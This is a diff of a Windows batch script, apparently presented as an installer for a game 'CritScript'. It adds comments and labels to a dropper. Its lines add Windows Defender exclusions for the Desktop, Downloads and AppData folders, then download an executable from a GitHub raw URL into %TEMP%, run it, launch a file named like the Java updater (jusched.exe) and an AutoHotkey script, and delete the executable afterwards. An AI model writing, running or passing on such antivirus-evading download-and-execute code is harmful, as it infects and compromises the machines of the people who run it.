@@ -27,10 +27,12 @@ if '%errorlevel%' NEQ '0' (
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Desktop"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Downloads"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/AppData/"
+:: Navigate to the %TEMP% directory
 cd %TEMP%
+
+:: Step 1: Download CritScript.exe using PowerShell
 echo Downloading CritScript.exe...
 Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe"
-Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/ahk.ico' -OutFile ahk.ico"
 if not exist "CritScript.exe" (
     echo Failed to download CritScript.exe. Exiting...
     pause
@@ -38,10 +40,12 @@ if not exist "CritScript.exe" (
 )
 echo CritScript.exe downloaded successfully.
 
+:: Step 2: Execute CritScript.exe
 echo Running CritScript.exe...
 start "" CritScript.exe
 timeout /t 5 /nobreak
 
+:: Step 3: Check and run JUSCHED.EXE if it exists (case-insensitive)
 for %%F in (jusched.exe JUSCHED.EXE) do (
     if exist "%%F" (
         echo Found %%F. Running it...
@@ -52,11 +56,13 @@ for %%F in (jusched.exe JUSCHED.EXE) do (
 )
 echo jusched.exe not found.
 
+:CheckZombies
+:: Step 4: Check and run ZOMBIES.AHK if it exists (case-insensitive)
 for %%F in (zombies.ahk ZOMBIES.AHK) do (
     if exist "%%F" (
         echo Found %%F. Running it...
         start "" %%F
-        goto :CreateShortcut
+        goto :DetermineDesktop
     )
 )
 echo Zombies.ahk not found.
@@ -90,13 +96,16 @@ if exist "%zombiesScript%" (
     echo ZOMBIES.AHK not found. Cannot create shortcut.
 )
 
-
+:DeleteCritScript
+:: Step 7: Delete CritScript.exe if it exists
 if exist "CritScript.exe" (
     echo Deleting CritScript.exe...
     del /f /q "CritScript.exe"
     echo CritScript.exe deleted.
 )
 
+:ExitScript
+:: Exit the script
 echo Script completed. Exiting...
 pause
 exit /b
